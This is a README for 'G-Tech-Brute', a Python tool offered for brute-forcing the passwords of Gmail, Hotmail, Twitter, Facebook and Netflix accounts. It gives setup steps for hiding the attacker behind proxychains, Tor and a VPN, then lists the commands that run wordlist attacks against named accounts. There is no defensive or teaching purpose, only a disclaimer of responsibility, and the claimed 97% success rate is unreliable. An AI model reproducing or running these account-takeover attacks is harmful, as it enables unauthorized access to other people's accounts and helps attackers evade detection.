# G-Tech-Brute

### I am NOT taking any responsibility!

## Brute Force for Social Accounts

Hacking toolkit for multible social media accounts. Brute force will give you the correct password almost everytime (97%) If you follow the steps below. Works with out proxies well but sometimes it gives a error like this:

```bash 
File "/usr/lib/python3.10/smtplib.py", line 739, in login
    (code, resp) = self.auth(
  File "/usr/lib/python3.10/smtplib.py", line 642, in auth
    (code, resp) = self.docmd("AUTH", mechanism + " " + response)
  File "/usr/lib/python3.10/smtplib.py", line 432, in docmd
    return self.getreply()
  File "/usr/lib/python3.10/smtplib.py", line 405, in getreply
    raise SMTPServerDisconnected("Connection unexpectedly closed")
smtplib.SMTPServerDisconnected: Connection unexpectedly closed
 ```
 # Don't let that happen, let's set proxies.
 --------
 
 ## Setting up the proxy
 
 After clonning the repository in **/root** go to-
 ```bash 
 /root/G-Tech/Proxy/Proxy-List.txt
 ```
 Copy 4-5 proxy and go to terminal/terminal emulator
 
 ```bash 
 nano /etc/proxychains4.conf
 ```
 
 Set the proxies as raw. Then reboot your device and "service tor start", now we are fully ready to start hacking!
 --------
 
 # Starting the Tool
 
 G-Tech doesn't need dependencies pr requirements. All it needs is YOU to brute force.
 go to:
 
 ```bash
 /root/G-Tech
 ```
 Then open a terminal there and write:
 
 ```bash
 python3 G-Tech.py -h
 ```
 It bring you a help menu, now you start brute-forcing;
 
 ## Gmail Brute Forcing
 
 ```bash
 python3 G-Tech.py -g/--gmail accounthere@gmail.com -l wordlist here
 python3 G-Tech.py -g/--gmail accounthere@gmail.com -l single password here
 ```
 ## Hotmail Brute Forcing
 
 ```bash
 python3 G-Tech.py -t/--hotmail accounthere@hotmail -l wordlist here
 python3 G-Tech.py -t/--hotmail accounthere@hotmail -l single password here
 ```
 
 ## Twitter Brute Forcing
 
 ```bash
  python3 G-Tech.py -T/--twitter accountnamehere -l wordlist here
  python3 G-Tech.py -T/--twitter accountnamehere -l single password here
  ```
  
  ## Facebook Brute Forcing
  
  ```bash
  python3 G-Tech.py -f/--facebook accountnamehere/username -l wordlist here
  python3 G-Tech.py -f/--facebook accountnamehere/username -l single password here
  ```
  
  ## Netflix Brute Forcing
  VPN Recommended (Like ProtonVPN, OpenVPN or NordVPN)
  
  ```bash
  python3 G-Tech.py -n/--netflix accountnamehere -l wordlist here
  python3 G-Tech.py -n/--netflix accountnamehere -l single password here
  ```
  
  
  
  
  
  
  That was all for me, I hope you won't anything illegal, because I am NOT taking any responsibility!
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
